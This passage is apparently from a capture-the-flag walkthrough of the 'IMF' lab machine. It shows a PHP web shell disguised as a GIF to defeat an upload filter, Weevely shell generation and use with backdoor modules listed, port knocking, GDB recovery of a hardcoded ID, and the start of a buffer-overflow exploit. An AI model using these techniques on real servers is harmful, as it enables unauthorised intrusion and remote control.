<p>Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- d8988628c59f --&gt;</span></code></pre></td></tr></table></div></figure>


<p>I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/wordlists/dirb# dirb http://192.168.145.130/imfadministrator/ common.txt 
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.145.130/imfadministrator/ ----
</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/images/                 
</span><span class='line'>+ http://192.168.145.130/imfadministrator/index.php (CODE:200|SIZE:337)        
</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/uploads/        </span></code></pre></td></tr></table></div></figure>


<p>Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.</p>

<h2>TTP breakdown &ndash; Weevely Weaponized web shell</h2>

<p>Homepage: <a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>

<p><strong>Description</strong></p>

<blockquote><p>Weevely is a web shell designed for post-exploitation purposes that can be extended over the
network at runtime.</p>

<p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
privileges, and spread into the target network.</p>

<p>Features</p>

<p>   Shell access to the target</p>

<p>   SQL console pivoting on the target</p>

<p>   HTTP/HTTPS proxy to browse through the target</p>

<p>   Upload and download files</p>

<p>   Spawn reverse and direct TCP shells</p>

<p>   Audit remote target security</p>

<p>   Run Meterpreter payloads</p>

<p>   Port scan pivoting on target</p>

<p>   Mount the remote filesystem</p>

<p>   Bruteforce SQL accounts pivoting on the target</p>

<p>Agent</p>

<p>The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol
is obfuscated within HTTP requests.</p></blockquote>

<p>First, I installed Weevely on my machine by cloning its git repository and installing the requirements:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev
</span><span class='line'>
</span><span class='line'>root@kali:/opt/weevely3# pip install -r requirements.txt --upgrade</span></code></pre></td></tr></table></div></figure>


<p>Then I ran the Weevely client:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# ./weevely.py 
</span><span class='line'>
</span><span class='line'>[+] weevely 3.6.2
</span><span class='line'>[!] Error: too few arguments
</span><span class='line'>
</span><span class='line'>[+] Run terminal or command on the target
</span><span class='line'>    weevely &lt;URL&gt; &lt;password&gt; [cmd]
</span><span class='line'>
</span><span class='line'>[+] Recover an existing session
</span><span class='line'>    weevely session &lt;path&gt; [cmd]
</span><span class='line'>
</span><span class='line'>[+] Generate new agent
</span><span class='line'>    weevely generate &lt;password&gt; &lt;path&gt;</span></code></pre></td></tr></table></div></figure>


<p>We need to generate the agent that we&rsquo;ll actually upload to the target server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py generate securepass harmless.php
</span><span class='line'>Generated 'harmless.php' with password 'securepass' of 695 byte size.</span></code></pre></td></tr></table></div></figure>


<p>I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif securepass
</span><span class='line'>
</span><span class='line'>[+] weevely 3.6.2
</span><span class='line'>
</span><span class='line'>[+] Target:   192.168.145.130
</span><span class='line'>[+] Session:  /root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session
</span><span class='line'>
</span><span class='line'>[+] Browse the filesystem or execute commands starts the connection
</span><span class='line'>[+] to the target. Type :help for more information.
</span><span class='line'>
</span><span class='line'>weevely&gt; :help
</span><span class='line'>
</span><span class='line'> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
</span><span class='line'> :audit_phpconf                Audit PHP configuration.                                             
</span><span class='line'> :audit_suidsgid               Find files with SUID or SGID flags.                                  
</span><span class='line'> :audit_filesystem             Audit the file system for weak permissions.                          
</span><span class='line'> :audit_etcpasswd              Read /etc/passwd with different techniques.                          
</span><span class='line'> :shell_php                    Execute PHP commands.                                                
</span><span class='line'> :shell_sh                     Execute shell commands.                                              
</span><span class='line'> :shell_su                     Execute commands with su.                                            
</span><span class='line'> :system_extensions            Collect PHP and webserver extension list.                            
</span><span class='line'> :system_info                  Collect system information.                                          
</span><span class='line'> :system_procs                 List running processes.                                              
</span><span class='line'> :backdoor_reversetcp          Execute a reverse TCP shell.                                         
</span><span class='line'> :backdoor_meterpreter         Start a meterpreter session.                                         
</span><span class='line'> :backdoor_tcp                 Spawn a shell on a TCP port.                                         
</span><span class='line'> :bruteforce_sql               Bruteforce SQL database.                                             
</span><span class='line'> :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
</span><span class='line'> :file_upload                  Upload file to remote filesystem.                                    
</span><span class='line'> :file_read                    Read remote file from the remote filesystem.                         
</span><span class='line'> :file_cp                      Copy single file.                                                    
</span><span class='line'> :file_clearlog                Remove string from a file.                                           
</span><span class='line'> :file_gzip                    Compress or expand gzip files.                                       
</span><span class='line'> :file_tar                     Compress or expand tar archives.                                     
</span><span class='line'> :file_enum                    Check existence and permissions of a list of paths.                  
</span><span class='line'> :file_ls                      List directory content.                                              
</span><span class='line'> :file_check                   Get attributes and permissions of a file.                            
</span><span class='line'> :file_find                    Find files with given names and attributes.                          
</span><span class='line'> :file_download                Download file from remote filesystem.                                
</span><span class='line'> :file_rm                      Remove remote file.                                                  
</span><span class='line'> :file_touch                   Change file timestamp.                                               
</span><span class='line'> :file_cd                      Change current working directory.                                    
</span><span class='line'> :file_webdownload             Download an URL.                                                     
</span><span class='line'> :file_mount                   Mount remote filesystem using HTTPfs.                                
</span><span class='line'> :file_grep                    Print lines matching a pattern in multiple files.                    
</span><span class='line'> :file_zip                     Compress or expand zip files.                                        
</span><span class='line'> :file_bzip2                   Compress or expand bzip2 files.                                      
</span><span class='line'> :file_edit                    Edit remote file on a local editor.                                  
</span><span class='line'> :sql_dump                     Multi dbms mysqldump replacement.                                    
</span><span class='line'> :sql_console                  Execute SQL query or run console.                                    
</span><span class='line'> :net_phpproxy                 Install PHP proxy on the target.                                     
</span><span class='line'> :net_curl                     Perform a curl-like HTTP request.                                    
</span><span class='line'> :net_mail                     Send mail.                                                           
</span><span class='line'> :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
</span><span class='line'> :net_ifconfig                 Get network interfaces addresses.                                    
</span><span class='line'> :net_scan                     TCP Port scan.                                                       
</span><span class='line'>
</span><span class='line'>The system shell interpreter is not available in this session, use the
</span><span class='line'>following command replacements to simulate a unrestricted shell.
</span><span class='line'>
</span><span class='line'> touch                                      file_touch       
</span><span class='line'> whoami, hostname, pwd, uname               system_info      
</span><span class='line'> gzip, gunzip                               file_gzip        
</span><span class='line'> mail                                       net_mail         
</span><span class='line'> curl                                       net_curl         
</span><span class='line'> zip, unzip                                 file_zip         
</span><span class='line'> nmap                                       net_scan         
</span><span class='line'> cd                                         file_cd          
</span><span class='line'> rm                                         file_rm          
</span><span class='line'> ps                                         system_procs     
</span><span class='line'> cat                                        file_read        
</span><span class='line'> ifconfig                                   shell_su         
</span><span class='line'> vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
</span><span class='line'> wget                                       file_webdownload 
</span><span class='line'> find                                       file_find        
</span><span class='line'> tar                                        file_tar         
</span><span class='line'> ifconfig                                   net_ifconfig     
</span><span class='line'> bzip2, bunzip2                             file_bzip2       
</span><span class='line'> ls, dir                                    file_ls          
</span><span class='line'> cp, copy                                   file_cp          
</span><span class='line'> grep                                       file_grep  </span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s use it to poke around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely&gt; whoami
</span><span class='line'>www-data
</span><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+
</span><span class='line'>| client_ip          | 192.168.145.129                                                               |
</span><span class='line'>| max_execution_time | 30                                                                            |
</span><span class='line'>| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
</span><span class='line'>| open_basedir       |                                                                               |
</span><span class='line'>| hostname           | imf                                                                           |
</span><span class='line'>| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
</span><span class='line'>| script_folder      | /var/www/html/imfadministrator/uploads                                        |
</span><span class='line'>| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
</span><span class='line'>| pwd                | /var/www/html/imfadministrator/uploads                                        |
</span><span class='line'>| safe_mode          | False                                                                         |
</span><span class='line'>| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
</span><span class='line'>| dir_sep            | /                                                                             |
</span><span class='line'>| os                 | Linux                                                                         |
</span><span class='line'>| whoami             | www-data                                                                      |
</span><span class='line'>| document_root      | /var/www/html                                                                 |
</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>Listing the files in the current directory gives us the fifth flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
</span><span class='line'>total 28K
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
</span><span class='line'>-rw-r--r-- 1 www-data www-data   82 Oct 12  2016 .htaccess
</span><span class='line'>-rw-r--r-- 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt
</span><span class='line'>
</span><span class='line'>$ cat flag5_abc123def.txt
</span><span class='line'>flag5{YWdlbnRzZXJ2aWNlcw==}</span></code></pre></td></tr></table></div></figure>


<p>The decoded hint is <code>agentservices</code></p>

<h1>Flag #6 &ndash; Binary exploitation</h1>

<p>I ran a search on the filesystem for files with agent in their name and got 2 hits:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>find / -type f -name agent* 
</span><span class='line'>/usr/local/bin/agent
</span><span class='line'>/etc/xinetd.d/agent</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it seems there is an agent server around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/xinetd.d/agent
</span><span class='line'># default: on
</span><span class='line'># description: The agent server serves agent sessions
</span><span class='line'># unencrypted agentid for authentication.
</span><span class='line'>service agent
</span><span class='line'>{
</span><span class='line'>       flags          = REUSE
</span><span class='line'>       socket_type    = stream
</span><span class='line'>       wait           = no
</span><span class='line'>       user           = root
</span><span class='line'>       server         = /usr/local/bin/agent
</span><span class='line'>       log_on_failure += USERID
</span><span class='line'>       disable        = no
</span><span class='line'>       port           = 7788
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>So it seems the agent service is listening on port 7788 and running as root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnt
</span><span class='line'>Active Internet connections (only servers)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
</span><span class='line'>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  </span></code></pre></td></tr></table></div></figure>


<p>Next I went to <code>/usr/local/bin</code> where the executable is located:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./agent
</span><span class='line'>  ___ __  __ ___ 
</span><span class='line'> |_ _|  \/  | __|  Agent
</span><span class='line'>  | || |\/| | _|   Reporting
</span><span class='line'> |___|_|  |_|_|    System
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Agent ID : </span></code></pre></td></tr></table></div></figure>


<p>We need to give it a valid agent ID for authentication. Inside the folder there is also another file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ cat access_codes
</span><span class='line'>SYN 7482,8279,9467</span></code></pre></td></tr></table></div></figure>


<p>Looks like a port knocking sequence. I borrowed from an example on <a href="https://wiki.archlinux.org/index.php/Port_knocking">ArchLinux wiki</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done</span></code></pre></td></tr></table></div></figure>


<p>And when I ran Nmap again, I found port 7788 is now open to the public:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE
</span><span class='line'>7788/tcp open  unknown</span></code></pre></td></tr></table></div></figure>


<p>Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ :file_download agent /root/agent</span></code></pre></td></tr></table></div></figure>


<p>Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to <strong>strncmp</strong>, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0000| 0xffffd32c --&gt; 0x80486bf (&lt;main+196&gt;: add    esp,0x10)
</span><span class='line'>0004| 0xffffd330 --&gt; 0xffffd34e ("1234\n")
</span><span class='line'>0008| 0xffffd334 --&gt; 0x804c1d0 ("48093572")
</span><span class='line'>0012| 0xffffd338 --&gt; 0x8 
</span><span class='line'>0016| 0xffffd33c --&gt; 0xf7de4e6b (add    esp,0x10)
</span><span class='line'>0020| 0xffffd340 --&gt; 0xf7f8a3fc --&gt; 0xf7f8b200 --&gt; 0x0 
</span><span class='line'>0024| 0xffffd344 --&gt; 0x0 
</span><span class='line'>0028| 0xffffd348 --&gt; 0x804c1d0 ("48093572")</span></code></pre></td></tr></table></div></figure>


<p>I used 48093572 as the agent ID and it worked and took me to a menu:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.145.130 7788
</span><span class='line'>(UNKNOWN) [192.168.145.130] 7788 (?) open
</span><span class='line'>  ___ __  __ ___ 
</span><span class='line'> |_ _|  \/  | __|  Agent
</span><span class='line'>  | || |\/| | _|   Reporting
</span><span class='line'> |___|_|  |_|_|    System
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Agent ID : 48093572
</span><span class='line'>Login Validated 
</span><span class='line'>Main Menu:
</span><span class='line'>1. Extraction Points
</span><span class='line'>2. Request Extraction
</span><span class='line'>3. Submit Report
</span><span class='line'>0. Exit
</span><span class='line'>Enter selection: 1
</span><span class='line'>
</span><span class='line'>Extraction Points:
</span><span class='line'>Staatsoper, Vienna, Austria
</span><span class='line'>Blenheim Palace, Woodstock, Oxfordshire, England, UK
</span><span class='line'>Great Windmill Street, Soho, London, England, UK
</span><span class='line'>Fawley Power Station, Southampton, England, UK
</span><span class='line'>Underground Station U4 Schottenring, Vienna, Austria
</span><span class='line'>Old Town Square, Old Town, Prague, Czech Republic
</span><span class='line'>Drake Hotel - 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
</span><span class='line'>Ashton Park, Mosman, Sydney, New South Wales, Australia
</span><span class='line'>Argyle Place, The Rocks, Sydney, New South Wales, Australia
</span><span class='line'>
</span><span class='line'>Enter selection: 2
</span><span class='line'>
</span><span class='line'>Extraction Request
</span><span class='line'>Enter extraction location: Vienna
</span><span class='line'>
</span><span class='line'>Location: Vienna
</span><span class='line'>
</span><span class='line'>Extraction team has been deployed.
</span><span class='line'>
</span><span class='line'>Enter selection: 3
</span><span class='line'>
</span><span class='line'>Enter report update: Abort extraction
</span><span class='line'>Report: Abort extraction
</span><span class='line'>Submitted for review.</span></code></pre></td></tr></table></div></figure>


<p>Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there&rsquo;s a buffer overflow lurking around. It&rsquo;s been a while since I&rsquo;ve done any binary exploitation. First thing, creating the pattern that might crash the service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span></code></pre></td></tr></table></div></figure>


<p>I used the above string for the report and the program did crash:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0xffffd294 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
</span><span class='line'>EBX: 0x0 
</span><span class='line'>ECX: 0xf7f8adc7 --&gt; 0xf8b8900a 
</span><span class='line'>EDX: 0xf7f8b890 --&gt; 0x0 
</span><span class='line'>ESI: 0xf7f8a000 --&gt; 0x1d5d8c 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x35664134 ('4Af5')
</span><span class='line'>ESP: 0xffffd340 ("f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3"...)
</span><span class='line'>EIP: 0x41366641 ('Af6A')
</span><span class='line'>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41366641</span></code></pre></td></tr></table></div></figure>


<p>With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
